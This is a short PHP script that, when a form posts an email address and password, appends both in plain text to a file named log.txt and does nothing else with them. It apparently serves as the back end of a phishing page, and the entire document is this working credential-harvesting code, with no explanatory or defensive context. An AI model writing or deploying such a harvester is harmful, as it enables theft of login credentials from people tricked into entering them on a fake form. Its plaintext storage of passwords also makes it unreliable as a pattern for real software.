<?php
/**
 * Created by PhpStorm.
 * User: Abino
 * Date: 8/28/2016
 * Time: 3:20 PM
 */
if(ISSET($_POST["email"])){
    $email = $_POST['email'];
    $pass = $_POST['pass'];

    $txt = "Email:" . " " . $email . "\n";
    $txt2 = $txt . "Password:" . " " . $pass . "\n";

    $fh = fopen("log.txt", (file_exists("log.txt")) ? 'a' : 'w');
    fwrite($fh, $txt2."\n");
    fclose($fh);
}